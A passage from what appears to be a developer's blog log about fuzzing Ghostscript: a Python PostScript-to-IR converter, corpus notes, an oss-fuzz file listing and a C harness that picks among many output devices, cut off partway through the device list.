			out += _emit_number_token(val)
		elif kind == 'LNAME':
			defined_vars.append('/' + val)
			out += bytes([IR.I_LNAME]) + pack_allowed(val.encode('latin1'))
		elif kind == 'ENAME':
			out += _emit_name(val, defined_vars)
		elif kind == 'STRING':
			body = val[1:-1]
			out += bytes([IR.I_STRING]) + pack_allowed(body.encode('latin1'))
		elif kind == 'BOOL':
			out += bytes([IR.I_BOOL]) + bytes([val])  # val already 0/1
		elif kind == 'HEXDICT':
			out += _emit_hex_or_dict(val, defined_vars)
		elif kind == 'ARRAY':
			out += bytes([IR.ARR_S])
			inner = val[1:-1]
			inner_toks = _tokenize_expr(inner)
			encode_tokens(inner_toks, defined_vars, out)
			out += bytes([IR.ARR_E])
		elif kind == 'PROC':
			out += bytes([IR.PROC_S])
			inner = val[1:-1]
			inner_toks = _tokenize_expr(inner)
			encode_tokens(inner_toks, defined_vars, out)
			out += bytes([IR.PROC_E])
		else:
			# unknown token kinds are ignored
			pass

def ps_to_ir(ps_text: str) -> bytes:
	dprint("Called ps_to_ir...")
	defined_vars: List[str] = []
	out = bytearray()
	exprs = _split_expressions(ps_text)
	dprint("exprs: "+str(exprs))
	for line in exprs:
		toks = _tokenize_expr(line)
		encode_tokens(toks, defined_vars, out)
		out += bytes([IR.END_EXPR])
	return bytes(out)

import sys

def test():
	if len(sys.argv) != 2:
		ps = r"""/boxsize
		  inwidth inheight gt
		  { pagewidth inwidth truncate 1 .max div }
		  { pageheight inheight truncate 1 .max div }
		  ifelse
		def
		1 1 add
		"""
	else:
		fh = open(sys.argv[1], "r")
		ps = fh.read()
		fh.close()

	blob = ps_to_ir(ps)
	fh = open("output.bin", "wb")
	fh.write(blob)
	fh.close()
	print("Forward....")
	# print(IR.ir_to_postscript(blob).decode('latin1'))

	stuff = IR.ir_to_postscript(blob).decode('latin1')
	print(stuff)
	fh = open("roundtrip.ps", "w")
	fh.write(stuff)
	fh.close()
	return

if __name__=="__main__":
	test()
	exit(0)

```

Now, it really sucks that the percent sign is used for both comments and some special markers. This is bad design in my opinion, but too bad I guess...

There was another bug or actually my own design choice which made the fuzzer bad. I was under the assumption that newlines were only for show and didn't affect program execution, but I was painfully mistaken and as a result I now have this:

```

# ps_to_ir.py
import re
import struct
from typing import List, Tuple

import setup
import forward as IR

# Build operator index from your FUNCS list
setup.run_setup()
FUNCS = setup.FUNCS
FUNC_INDEX = {name: i for i, (name, _argc) in enumerate(FUNCS)}

# Allowed chars (must match your tiny_ps_ir.ALLOWED_CHARS)
ALLOWED = IR.ALLOWED_CHARS
IDX = {chr(c): i for i, c in enumerate(ALLOWED)}

NUMS = set(list("0987654321"))
HEX_NO_NUMS = set(list("abcdefABCDEF"))
HEX_CHARS = NUMS.union(HEX_NO_NUMS) # Can not do NUMS + HEX_NO_NUMS
SPECIAL_PCT_LINES   = { '%END', '%EOF', '%EOD', '%ENDDATA' }
SPECIAL_PCT_PREFIX  = ('%!', '%%')  # file header and DSC directives

DEBUG = False

def dprint(s: str) -> None:
	if DEBUG:
		print("[DEBUG] " + str(s))

def is_special_pct_line(line: str) -> bool:
	s = line.rstrip('\r\n')
	if any(s.startswith(p) for p in SPECIAL_PCT_PREFIX):
		return True
	# exact-match sentinels
	return s in SPECIAL_PCT_LINES

def pack_allowed(s: bytes) -> bytes:
	out = bytearray()
	s_dec = s.decode('latin1')
	for ch in s_dec:
		if ch in IDX:
			out.append(IDX[ch])
		else:
			dprint("Encountered invalid string: "+str(s_dec))
			# assert False
			out.append(IDX.get('A', 0))  # fallback
	out.append(0xFF)
	return bytes(out)

def pack_raw(s: bytes) -> bytes:
	assert len(s) <= 2**16
	out = struct.pack('<h', len(s)) + s
	assert len(out) == len(s) + 2
	return out

# ------------- Tokenizer (minimal but robust) -------------
_WS = b" \t\r\n\f\v"
_STOP = set(b"()[]{}<>/% \t\r\n\f\v")
_STOP_NO_COMMENT = set(b"()[]{}<>/ \t\r\n\f\v")
_comment = re.compile(rb'%[^\r\n]*')
_number = re.compile(rb'[+-]?(?:\d+\.\d*|\d*\.\d+|\d+)')

def _skip_comment(b: bytes, i: int) -> int:
	n = len(b)
	while i < n and b[i] not in b"\r\n":
		i += 1
	return i

def _read_string(b: bytes, i: int) -> Tuple[str, int]:
	out = bytearray(b'('); i += 1; depth = 1; n = len(b)
	while i < n and depth > 0:
		c = b[i]; out.append(c); i += 1
		if c == ord('\\'):
			if i < n: out.append(b[i]); i += 1
		elif c == ord('('): depth += 1
		elif c == ord(')'): depth -= 1
	return out.decode('latin1'), i

# def _read_string_raw(b: bytes, i: int) -> Tuple[str, int]:


def _read_balanced(b: bytes, i: int, o: int, c: int) -> Tuple[str, int]:
	out = bytearray([b[i]]); i += 1; depth = 1; n = len(b)
	while i < n and depth > 0:
		ch = b[i]
		if ch == ord('%'):
			j = _skip_comment(b, i); out += b[i:j]; i = j; continue
		if ch == ord('('):
			s, i = _read_string(b, i); out += s.encode('latin1'); continue
		out.append(ch); i += 1
		if ch == o: depth += 1
		elif ch == c: depth -= 1
	return out.decode('latin1'), i

def _read_hex_or_dict(b: bytes, i: int) -> Tuple[str, int]:
	n = len(b)
	if i + 1 < n and b[i+1] == ord('<'):
		# dict
		out = bytearray(b'<<'); i += 2; depth = 1
		while i < n and depth > 0:
			if b[i] == ord('%'):
				j = _skip_comment(b, i); out += b[i:j]; i = j; continue
			if b[i] == ord('('):
				s, i = _read_string(b, i); out += s.encode('latin1'); continue
			if i + 1 < n and b[i] == ord('<') and b[i+1] == ord('<'):
				out += b'<<'; i += 2; depth += 1; continue
			if i + 1 < n and b[i] == ord('>') and b[i+1] == ord('>'):
				out += b'>>'; i += 2; depth -= 1; continue
			out.append(b[i]); i += 1
		return out.decode('latin1'), i
	else:
		# hexstring
		out = bytearray(b'<'); i += 1
		while i < n:
			out.append(b[i]); c = b[i]; i += 1
			if c == ord('>'): break
		return out.decode('latin1'), i

def _read_word(b: bytes, i: int, disallowed_chars: set) -> Tuple[str, int]:
	n = len(b); s = i; nl = False
	while i < n and b[i] not in disallowed_chars:
		i += 1
	if not i < n:
		return b[s:i].decode('latin1'), i, nl
	dprint("b[i:] : "+str(b[i:]))
	dprint("b[i]: "+str(b[i]))
	if b[i] == ord('\n'): # Check for newline.
		nl = True
	return b[s:i].decode('latin1'), i, nl

def _split_expressions(ps: str) -> List[str]:
	"""Split PS into logical expressions. If a line starts with /name, keep reading until top-level 'def'."""
	# This ugly hack is to get rid of invalid characters...
	b = ps.encode('latin1', 'ignore'); i = 0; n = len(b)
	out, buf = [], bytearray()
	in_def = False
	while i < n:
		c = b[i]
		#if c == ord('%'):
		#	i = _skip_comment(b, i); continue

		if c == ord('%'):
			# flush any buffered code on this line
			line = buf.decode('latin1').strip()
			if line:
				out.append(line)
			buf.clear()
			j = _skip_comment(b, i)
			raw = b[i:j].decode('latin1').rstrip()
			dprint("raw: "+str(raw))
			if is_special_pct_line(raw):
				out.append(raw)  # keep as its own expression
			# consume newline if present
			i = j
			if i < n and b[i] in b'\r\n':
				if b[i] == ord('\r') and i+1 < n and b[i+1] == ord('\n'):
					i += 2
				else:
					i += 1
			continue

		if c == ord('('):
			s, i = _read_string(b, i); buf += s.encode('latin1'); continue
		if c == ord('['):
			s, i = _read_balanced(b, i, ord('['), ord(']')); buf += s.encode('latin1'); continue
		if c == ord('{'):
			s, i = _read_balanced(b, i, ord('{'), ord('}')); buf += s.encode('latin1'); continue
		if c == ord('<'):
			s, i = _read_hex_or_dict(b, i); buf += s.encode('latin1'); continue

		if not buf.strip() and c == ord('/'):
			in_def = True

		if in_def and c == ord('d') and b[i:i+3] == b'def' and (i+3 == n or b[i+3] in _WS + b"()[]{}<>/%"):
			buf += b'def'; i += 3
			out.append(buf.decode('latin1').strip()); buf.clear(); in_def = False
			while i < n and b[i] in _WS:
				if b[i] in b'\r\n':
					if b[i] == ord('\r') and i+1 < n and b[i+1] == ord('\n'): i += 2
					else: i += 1
					break
				i += 1
			continue

		if c in (ord('\n'), ord('\r')) and not in_def:
			line = buf.decode('latin1').strip()
			if line: out.append(line)
			buf.clear()
			if c == ord('\r') and i+1 < n and b[i+1] == ord('\n'): i += 2
			else: i += 1
			continue

		buf.append(c); i += 1

	last = buf.decode('latin1').strip()
	if last: out.append(last)
	return out

def _tokenize_expr(expr: str) -> List[Tuple[str, str]]:
	"""Return [('INT','123'), ('ENAME','moveto'), ('LNAME','box'), ('STRING','(abc)'), ...]"""
	b = expr.encode('latin1'); i = 0; n = len(b)
	toks: List[Tuple[str,str]] = []
	while i < n:
		while i < n and b[i] in _WS: i += 1
		if i >= n: break
		c = b[i]
		dprint("Current buffer: "+str(b[i:]))
		if c == ord('%'):
			# Check if special string...
			if not is_special_pct_line(expr):
				i = _skip_comment(b, i); continue # Is not special, so comment.
			else:
				dprint("String "+str(expr)+" is special...")
		elif c == ord('('):
			s, i = _read_string(b, i); toks.append(('STRING', s)); continue
		elif c == ord('['):
			s, i = _read_balanced(b, i, ord('['), ord(']')); toks.append(('ARRAY', s)); continue
		elif c == ord('{'):
			s, i = _read_balanced(b, i, ord('{'), ord('}')); toks.append(('PROC', s)); continue
		elif c == ord('<'):
			s, i = _read_hex_or_dict(b, i); toks.append(('HEXDICT', s)); continue
		elif c == ord('/'):
			i += 1; w, i, _ = _read_word(b, i, _STOP); toks.append(('LNAME', w)); continue
		elif c in (ord('}'), ord(')'), ord('>'), ord(']')):
			i += 1; continue
		m = _number.match(b, i)
		if m:
			txt = m.group(0).decode('latin1'); i = m.end()
			toks.append(('NUM', txt)); continue
		dprint("Current buffer 2: "+str(b[i:]))
		w, i, nl = _read_word(b, i, _STOP_NO_COMMENT)
		dprint("w: "+str(w))
		dprint("nl: "+str(nl))
		if w:
			if w not in ("false", "true"):
				toks.append(('ENAME', w))
			else:
				toks.append(('BOOL', 1 if w == "true" else 0))
			if nl:
				# Append newline end of expression too...
				toks.append(('END_EXPR', None))
	return toks

# ------------- Encoder: tokens -> IR (now fully recursive) -------------
def _emit_name(name: str, defined_vars: List[str]) -> bytes:
	if name in FUNC_INDEX:
		idx = FUNC_INDEX[name]
		return bytes([IR.LOOKUP_FUNC]) + struct.pack('<h', idx)
	if ('/' + name) in defined_vars:
		vidx = defined_vars.index('/' + name)
		return bytes([IR.LOOKUP_VAR]) + struct.pack('<h', vidx)
	return bytes([IR.I_ENAME]) + pack_allowed(name.encode('latin1'))

def _emit_number_token(val: str) -> bytes:
	if '.' in val:
		try:
			intpart, frac = val.split('.', 1)
			intpart = max(0, min(0xFFFF, int(intpart or '0')))
			frac = ''.join(ch for ch in frac if ch.isdigit()) or '0'
			frac = max(0, min(0xFFFF, int(frac)))
		except Exception:
			intpart, frac = 0, 0
		u = (intpart << 16) | frac
		return bytes([IR.I_REAL32]) + IR.varint_encode(IR.zz_encode(u))
	else:
		return bytes([IR.I_INT]) + IR.varint_encode(IR.zz_encode(int(val)))

def _clean_hex(s: str) -> str:
	o = ""
	for c in s:
		if c in HEX_CHARS:
			o += c
	return o

def _emit_hex_or_dict(val: str, defined_vars: List[str]) -> bytes:
	if val.startswith('<<'):
		# Keep as empty dict placeholder for now
		# return bytes([IR.DICT_S]) + bytes([IR.DICT_E])
		# Parse the inner tokens and keep them
		inner = val[2:-2]
		out = bytearray([IR.DICT_S])
		inner_toks = _tokenize_expr(inner)
		encode_tokens(inner_toks, defined_vars, out)
		out.append(IR.DICT_E)
		return bytes(out)
	else:
		# hexstring
		s = val[1:-1].strip()
		# Just throw out all non-hex characters...
		s = _clean_hex(s)
		# Maybe we should actually check like this here:
		# if len(s) % 2 == 1:
		# 	s = s + "0"
		if len(s) % 2 == 1:
			s = s[:-1] + "0" + s[-1]
		dprint("s: "+str(s))
		hexbytes = bytes.fromhex(s)
		return bytes([IR.I_HEX]) + pack_raw(hexbytes)

def encode_tokens(toks: List[Tuple[str, str]], defined_vars: List[str], out: bytearray) -> None:
	"""
	Recursively encode a token list into IR.
	Handles nested ARRAY and PROC (and HEXDICT) anywhere.
	"""
	for kind, val in toks:
		if kind == 'NUM':
			out += _emit_number_token(val)
		elif kind == 'LNAME':
			defined_vars.append('/' + val)
			out += bytes([IR.I_LNAME]) + pack_allowed(val.encode('latin1'))
		elif kind == 'ENAME':
			out += _emit_name(val, defined_vars)
		elif kind == 'STRING':
			body = val[1:-1]
			out += bytes([IR.I_STRING]) + pack_allowed(body.encode('latin1'))
		elif kind == 'BOOL':
			out += bytes([IR.I_BOOL]) + bytes([val])  # val already 0/1
		elif kind == 'HEXDICT':
			out += _emit_hex_or_dict(val, defined_vars)
		elif kind == 'ARRAY':
			out += bytes([IR.ARR_S])
			inner = val[1:-1]
			inner_toks = _tokenize_expr(inner)
			encode_tokens(inner_toks, defined_vars, out)
			out += bytes([IR.ARR_E])
		elif kind == 'PROC':
			out += bytes([IR.PROC_S])
			inner = val[1:-1]
			inner_toks = _tokenize_expr(inner)
			encode_tokens(inner_toks, defined_vars, out)
			out += bytes([IR.PROC_E])
		elif kind == 'END_EXPR':
			out += bytes([IR.END_EXPR])
		else:
			# unknown token kinds are ignored
			pass

def ps_to_ir(ps_text: str) -> bytes:
	dprint("Called ps_to_ir...")
	defined_vars: List[str] = []
	out = bytearray()
	exprs = _split_expressions(ps_text)
	dprint("exprs: "+str(exprs))
	for line in exprs:
		toks = _tokenize_expr(line)
		encode_tokens(toks, defined_vars, out)
		out += bytes([IR.END_EXPR])
	return bytes(out)

import sys

def test():
	if len(sys.argv) != 2:
		ps = r"""/boxsize
		  inwidth inheight gt
		  { pagewidth inwidth truncate 1 .max div }
		  { pageheight inheight truncate 1 .max div }
		  ifelse
		def
		1 1 add
		"""
	else:
		fh = open(sys.argv[1], "r")
		ps = fh.read()
		fh.close()

	blob = ps_to_ir(ps)
	fh = open("output.bin", "wb")
	fh.write(blob)
	fh.close()
	print("Forward....")
	# print(IR.ir_to_postscript(blob).decode('latin1'))

	stuff = IR.ir_to_postscript(blob).decode('latin1')
	print(stuff)
	fh = open("roundtrip.ps", "w")
	fh.write(stuff)
	fh.close()
	return

if __name__=="__main__":
	test()
	exit(0)

```

which should preserve the stuff and now this here:

```
/S 80 string def
108 480 moveto
/Helvetica 12 selectfont
 { currentfile S readline pop dup (%END) eq { pop exit } if
   gsave show grestore 0 -15 rmoveto
 } loop
Let the distance in inches from the left edge of the page to
the vertical line be H, and from the bottom edge to the
horizontal line be V; let the lengths of the gaps at the top
and bottom of the vertical line be T and B respectively
%END
/res currentpagedevice /HWResolution get def
(        x = (1 - H) * ) show res 0 get =string cvs show
(, y = (V - 1) * ) show res 1 get =string cvs show

showpage
```

roundtrips correctly. Before the lines were joined together which lead to crashes...

Now when running my corpus of over a thousand files it doesn't encounter any crash after roundtrip after running the thing. This does not mean that our corpus generator is perfect since there are functions which start with a percent sign and such function calls, but it is good enough for our purposes. I will of course improve upon this further...

## Starting fuzzing campaign number 2

Ok, so I started fuzzing again with a slightly improved corpus and some modifications...

## Getting an even better corpus

So my problem is that there is a bad corpus which doesn't exercise the majority of the stuff. Therefore I am thinking of getting a better corpus. I found this here:  https://labs.pdfa.org/stressful-corpus/ which seems

... an hour later ...

ok so that corpus didn't really have any interesting inputs in it, so I just decided to manually download some of the bugs out of the public bug tracker and just be done with it.

## Results???

Ok, so while that is actually running, I am going to compile a pdf fuzzer. I am going to use the oss-fuzz stuff as a base and then branch from there...

## Fuzzing actual PDF files...

Ok, so there are plenty of devices and stuff which I can try to fuzz and let's see how I can do that...

Looking at the oss-fuzz stuff initially:

```
oof@elskun-lppri:~/ghostscript_mutator/pdf_fuzzing/original$ ls -lhS
total 96K
-rwxr-xr-x 1 oof oof 5.1K Aug 20 03:19 build.sh
-rw-r--r-- 1 oof oof 3.6K Aug 20 03:19 gs_fuzzlib.h
-rw-r--r-- 1 oof oof 1.4K Aug 20 03:19 gstoraster_ps_fuzzer.cc
-rw-r--r-- 1 oof oof 1.3K Aug 20 03:19 Dockerfile
-rw-r--r-- 1 oof oof 1.2K Aug 20 03:19 gstoraster_pdf_fuzzer.cc
-rw-r--r-- 1 oof oof 1014 Aug 20 03:19 gstoraster_fuzzer_all_colors.cc
-rw-r--r-- 1 oof oof  900 Aug 20 03:19 gs_device_pdfwrite_opts_fuzzer.cc
-rw-r--r-- 1 oof oof  868 Aug 20 03:19 gs_device_tiffsep1_fuzzer.cc
-rw-r--r-- 1 oof oof  856 Aug 20 03:19 gstoraster_fuzzer.cc
-rw-r--r-- 1 oof oof  732 Aug 20 03:19 gs_device_eps2write_fuzzer.cc
-rw-r--r-- 1 oof oof  731 Aug 20 03:19 gs_device_pdfwrite_fuzzer.cc
-rw-r--r-- 1 oof oof  731 Aug 20 03:19 gs_device_ps2write_fuzzer.cc
-rw-r--r-- 1 oof oof  731 Aug 20 03:19 gs_device_pxlcolor_fuzzer.cc
-rw-r--r-- 1 oof oof  731 Aug 20 03:19 gs_device_xpswrite_fuzzer.cc
-rw-r--r-- 1 oof oof  730 Aug 20 03:19 gs_device_bmpmono_fuzzer.cc
-rw-r--r-- 1 oof oof  730 Aug 20 03:19 gs_device_psdcmyk_fuzzer.cc
-rw-r--r-- 1 oof oof  730 Aug 20 03:19 gs_device_pxlmono_fuzzer.cc
-rw-r--r-- 1 oof oof  729 Aug 20 03:19 gs_device_pgmraw_fuzzer.cc
-rw-r--r-- 1 oof oof  729 Aug 20 03:19 gs_device_png16m_fuzzer.cc
-rw-r--r-- 1 oof oof  728 Aug 20 03:19 gs_device_faxg3_fuzzer.cc
-rw-r--r-- 1 oof oof  537 Aug 20 03:19 project.yaml
-rw-r--r-- 1 oof oof   43 Aug 20 03:19 gstoraster_ps_fuzzer.options
-rw-r--r-- 1 oof oof   28 Aug 20 03:19 gstoraster_fuzzer_all_colors.options
```

those device files are basically for different target devices, but there are a lot of them missing. Here is a full list:

```
[/npdl /itk24i /appledmp /jpeg /lp9400 /hpdj340 /tiffgray /bmp16 /pnggray /lp7500 /epl5800 /ppm /rpdl /lj250 /cdj970 /pdfimage8 /oce9050 /itk38 /atx23 /jpegcmyk /lp9500c /hpdj400 /tifflzw /bmp16m /pngmono /lp7700 /epl5900 /ppmraw /samsunggdi /lj3100sw /cdjcolor /pgm /oki182 /iwhi /atx24 /jpeggray /lp9600 /hpdj500 /tiffpack /bmp256 /pngmonod /lp7900 /epl6100 /ps2write /sj48 /lj4dith /cdjmono /pgmraw /oki4w /iwlo /atx38 /mgr4 /lp9600s /hpdj500c /tiffscaled /bmp32b /ocr /lp8000 /epl6200 /pdfwrite /display /st800 /lj4dithp /cdnj500 /pgnm /okiibm /iwlq /bj10e /mgr8 /lp9800c /hpdj510 /tiffscaled24 /bmpgray /hocr /lp8000c /eplcolor /psdcmyk /x11 /stcolor /lj5gray /chp2200 /pgnmraw /oprp /jetp3852 /bj10v /mgrgray2 /lps4500 /hpdj520 /tiffscaled32 /bmpmono /pdfocr8 /lp8100 /eplmono /psdcmyk16 /x11alpha /t4693d2 /lj5mono /cljet5 /pkm /opvp /jj100 /bj10vh /mgrgray4 /lps6500 /hpdj540 /tiffscaled4 /bmpsep1 /pdfocr24 /lp8200c /eps9high /psdcmykog /x11cmyk /t4693d4 /ljet2p /cljet5c /pkmraw /paintjet /la50 /bj200 /mgrgray8 /lq850 /hpdj550c /tiffscaled8 /bmpsep8 /pdfocr32 /lp8300c /eps9mid /psdcmyktags /x11cmyk2 /t4693d8 /ljet3 /cljet5pr /pksm /pcl3 /la70 /bjc600 /mgrmono /lxm3200 /hpdj560c /tiffsep /ccr /nullpage /lp8300f /epson /psdcmyktags16 /x11cmyk4 /tek4696 /ljet3d /coslw2p /pksmraw /photoex /la75 /bjc800 /miff24 /lxm5700m /hpdj600 /tiffsep1 /cfax /lp8400f /epsonc /psdrgb /x11cmyk8 /uniprint /ljet4 /coslwxl /plan /picty180 /la75plus /bjc880j /pam /m8510 /hpdj660c /txtwrite /cif /lp8500c /escp /psdrgb16 /x11gray2 /xes /ljet4d /declj250 /plan9bm /pj /laserjet /bjccmyk /pamcmyk32 /md1xMono /hpdj670c /xcf /devicen /lp8600 /escpage /psdrgbtags /x11gray4 /appleraster /ljet4pjl /deskjet /planc /pjetxl /lbp310 /bjccolor /pamcmyk4 /md2k /hpdj680c /xcfcmyk /dfaxhigh /lp8600f /fmlbp /spotcmyk /x11mono /cups /ljetplus /dj505j /plang /pjxl /lbp320 /bjcgray /pbm /md50Eco /hpdj690c /xpswrite /dfaxlow /lp8700 /fmpr /tiff12nc /x11rg16x /pwgraster /ln03 /djet500 /plank /pjxl300 /lbp8 /bjcmono /pbmraw /md50Mono /hpdj850c /alc1900 /eps2write /lp8800c /fs600 /tiff24nc /x11rg32x /urf /lp1800 /djet500c /planm /pr1000 /lex2050 /cdeskjet /pcx16 /md5k /hpdj855c /alc2000 /faxg3 /lp8900 /gdi /tiff32nc /pclm /ijs /lp1900 /dl2100 /plib /pr1000_4 /lex3200 /cdj1600 /pcx24b /mj500c /hpdj870c /alc4000 /faxg32d /lp9000b /hl1240 /tiff48nc /pclm8 /png16 /lp2000 /dnj650c /plibc /pr150 /lex5700 /cdj500 /pcx256 /mj6000c /hpdj890c /alc4100 /faxg4 /lp9000c /hl1250 /tiff64nc /bbox /png16m /lp2200 /epl2050 /plibg /pr201 /lex7000 /cdj550 /pcxcmyk /mj700v2c /hpdjplus /alc8500 /fpng /lp9100 /hl7x0 /tiffcrle /bit /png16malpha /lp2400 /epl2050p /plibk /pxlcolor /lips2p /cdj670 /pcxgray /mj8000c /hpdjportable /alc8600 /inferno /lp9200b /hpdj1120c /tiffg3 /bitcmyk /png256 /lp2500 /epl2120 /plibm /pxlmono /lips3 /cdj850 /pcxmono /ml600 /ibmpro /alc9100 /ink_cov /lp9200c /hpdj310 /tiffg32d /bitrgb /png48 /lp2563 /epl2500 /pnm /r4081 /lips4 /cdj880 /pdfimage24 /necp6 /imagen /ap3250 /inkcov /lp9300 /hpdj320 /tiffg4 /bitrgbtags /pngalpha /lp3000c /epl2750 /pnmraw /rinkj /lips4v /cdj890 /pdfimage32]
```

and there are plenty of them there, so I am basically wondering how can I fuzz all of these different devices. First idea is to just use the first byte as the target device.

Looking at the other files, there is also the all colours..

Here:

```
#include "gs_fuzzlib.h"

extern "C" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
        if (size == 0) {
                return 0;
        }
        // Modulo the possibilities: https://github.com/ArtifexSoftware/ghostpdl/blob/8c97d5adce0040ac38a1fb4d7954499c65f582ff/cups/libs/cups/raster.h#L102
        // This enables the fuzzer to explore all color schemes
        int color_scheme = ((int)data[0] % 63);
        data++;
        size--;

        gs_to_raster_fuzz(data, size, color_scheme);
        return 0;
}
```

so I am thinking of just doing one which fuzzes all of the target devices maybe????

This is something which I came up with:

```
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

#include "psi/iapi.h"
#include "psi/interp.h"
#include "psi/iminst.h"
#include "base/gserrors.h"

#include <signal.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>

#include <pthread.h>
#include <stdatomic.h>
#include <limits.h>

static const unsigned char *g_data;
static size_t g_size;


#define min(x, y) ((x) < (y) ? (x) : (y))

static int gs_stdin(void *inst, char *buf, int len)
{
    size_t to_copy = min(len, g_size);
    to_copy = min(INT_MAX, to_copy);

    memcpy(buf, g_data, to_copy);

    g_data += to_copy;
    g_size -= to_copy;

    return to_copy;
}

static int gs_stdnull(void *inst, const char *buf, int len)
{
    /* Just discard everything. */
    return len;
}

int fuzz_gs_device(
    const unsigned char *buf,
    size_t size,
    int color_scheme,
    const char *device_target,
    const char *output_file,
    int do_interpolation
)
{
    int ret;
    void *gs = NULL;
    char color_space[50];
    char gs_device[50];
    char gs_o[100];
    char opt_interpolation[50];
    /*
     * We are expecting color_scheme to be in the [0:62] interval.
     * This corresponds to the color schemes defined here:
     * https://github.com/ArtifexSoftware/ghostpdl/blob/8c97d5adce0040ac38a1fb4d7954499c65f582ff/cups/libs/cups/raster.h#L102
     */
    sprintf(color_space, "-dcupsColorSpace=%d", color_scheme);
    sprintf(gs_device, "-sDEVICE=%s", device_target);
    sprintf(gs_o, "-sOutputFile=%s", output_file);
    if (do_interpolation) {
        sprintf(opt_interpolation, "-dDOINTERPOLATE");
    }
    else {
        sprintf(opt_interpolation, "-dNOINTERPOLATE");
    }
    /* Mostly stolen from cups-filters gstoraster. */
    char *args[] = {
        "gs",
        "-K1048576",
        "-r200x200",
        "-sBandListStorage=memory",
        "-dMaxBitmap=0",
        "-dBufferSpace=450k",
        "-dMediaPosition=1",
        color_space,
        "-dQUIET",
        "-dSAFER",
        "-dNOPAUSE",
        "-dBATCH",
        opt_interpolation,
        "-dNOMEDIAATTRS",
        "-sstdout=%%stderr",
        gs_o,
        gs_device,
        "-_",
    };
    int argc = sizeof(args) / sizeof(args[0]);

    /* Stash buffers globally, for gs_stdin(). */
    g_data = buf;
    g_size = size;

    ret = gsapi_new_instance(&gs, NULL);
    if (ret < 0) {
        fprintf(stderr, "gsapi_new_instance: error %d\n", ret);
        return ret;
    }

    gsapi_set_stdio(gs, gs_stdin, gs_stdnull, gs_stdnull);
    ret = gsapi_set_arg_encoding(gs, GS_ARG_ENCODING_UTF8);
    if (ret < 0) {
        fprintf(stderr, "gsapi_set_arg_encoding: error %d\n", ret);
        gsapi_delete_instance(gs);
        return ret;
    }

    ret = gsapi_init_with_args(gs, argc, args);
    if (ret && ret != gs_error_Quit)
        /* Just keep going, to cleanup. */
        fprintf(stderr, "gsapi_init_with_args: error %d\n", ret);

    ret = gsapi_exit(gs);
    if (ret < 0 && ret != gs_error_Quit) {
        fprintf(stderr, "gsapi_exit: error %d\n", ret);
        return ret;
    }

    gsapi_delete_instance(gs);

    return 0;
}



/* Pick target device from this list (no leading '/'). Got from "gs -h" */
static const char *k_devices[] = {
    "npdl","itk24i","appledmp","jpeg","lp9400","hpdj340","tiffgray","bmp16",
    "pnggray","lp7500","epl5800","ppm","rpdl","lj250","cdj970","pdfimage8",
    "oce9050","itk38","atx23","jpegcmyk","lp9500c","hpdj400","tifflzw",
    "bmp16m","pngmono","lp7700","epl5900","ppmraw","samsunggdi","lj3100sw",
    "cdjcolor","pgm","oki182","iwhi","atx24","jpeggray","lp9600","hpdj500",
    "tiffpack","bmp256","pngmonod","lp7900","epl6100","ps2write","sj48",
    "lj4dith","cdjmono","pgmraw","oki4w","iwlo","atx38","mgr4","lp9600s",
    "hpdj500c","tiffscaled","bmp32b","ocr","lp8000","epl6200","pdfwrite",
    "display","st800","lj4dithp","cdnj500","pgnm","okiibm","iwlq","bj10e",
    "mgr8","lp9800c","hpdj510","tiffscaled24","bmpgray","hocr","lp8000c",
    "eplcolor","psdcmyk","x11","stcolor","lj5gray","chp2200","pgnmraw",
    "oprp","jetp3852","bj10v","mgrgray2","lps4500","hpdj520","tiffscaled32",
    "bmpmono","pdfocr8","lp8100","eplmono","psdcmyk16","x11alpha","t4693d2",
    "lj5mono","cljet5","pkm","opvp","jj100","bj10vh","mgrgray4","lps6500",
    "hpdj540","tiffscaled4","bmpsep1","pdfocr24","lp8200c","eps9high",
    "psdcmykog","x11cmyk","t4693d4","ljet2p","cljet5c","pkmraw","paintjet",
    "la50","bj200","mgrgray8","lq850","hpdj550c","tiffscaled8","bmpsep8",
    "pdfocr32","lp8300c","eps9mid","psdcmyktags","x11cmyk2","t4693d8",
    "ljet3","cljet5pr","pksm","pcl3","la70","bjc600","mgrmono","lxm3200",
    "hpdj560c","tiffsep","ccr","nullpage","lp8300f","epson","psdcmyktags16",
    "x11cmyk4","tek4696","ljet3d","coslw2p","pksmraw","photoex","la75",
    "bjc800","miff24","lxm5700m","hpdj600","tiffsep1","cfax","lp8400f",
    "epsonc","psdrgb","x11cmyk8","uniprint","ljet4","coslwxl","plan",
    "picty180","la75plus","bjc880j","pam","m8510","hpdj660c","txtwrite",
    "cif","lp8500c","escp","psdrgb16","x11gray2","xes","ljet4d","declj250",
    "plan9bm","pj","laserjet","bjccmyk","pamcmyk32","md1xMono","hpdj670c",
    "xcf","devicen","lp8600","escpage","psdrgbtags","x11gray4","appleraster",
    "ljet4pjl","deskjet","planc","pjetxl","lbp310","bjccolor","pamcmyk4",
    "md2k","hpdj680c","xcfcmyk","dfaxhigh","lp8600f","fmlbp","spotcmyk",
    "x11mono","cups","ljetplus","dj505j","plang","pjxl","lbp320","bjcgray",
    "pbm","md50Eco","hpdj690c","xpswrite","dfaxlow","lp8700","fmpr",
    "tiff12nc","x11rg16x","pwgraster","ln03","djet500","plank","pjxl300",
    "lbp8","bjcmono","pbmraw","md50Mono","hpdj850c","alc1900","eps2write",
    "lp8800c","fs600","tiff24nc","x11rg32x","urf","lp1800","djet500c",
    "planm","pr1000","lex2050","cdeskjet","pcx16","md5k","hpdj855c",
    "alc2000","faxg3","lp8900","gdi","tiff32nc","pclm","ijs","lp1900",
    "dl2100","plib","pr1000_4","lex3200","cdj1600","pcx24b","mj500c",
    "hpdj870c","alc4000","faxg32d","lp9000b","hl1240","tiff48nc","pclm8",
    "png16","lp2000","dnj650c","plibc","pr150","lex5700","cdj500","pcx256",
    "mj6000c","hpdj890c","alc4100","faxg4","lp9000c","hl1250","tiff64nc",
    "bbox","png16m","lp2200","epl2050","plibg","pr201","lex7000","cdj550",
    "pcxcmyk","mj700v2c","hpdjplus","alc8500","fpng","lp9100","hl7x0",
    "tiffcrle","bit","png16malpha","lp2400","epl2050p","plibk","pxlcolor",
    "lips2p","cdj670","pcxgray","mj8000c","hpdjportable","alc8600","inferno",
    "lp9200b","hpdj1120c","tiffg3","bitcmyk","png256","lp2500","epl2120",
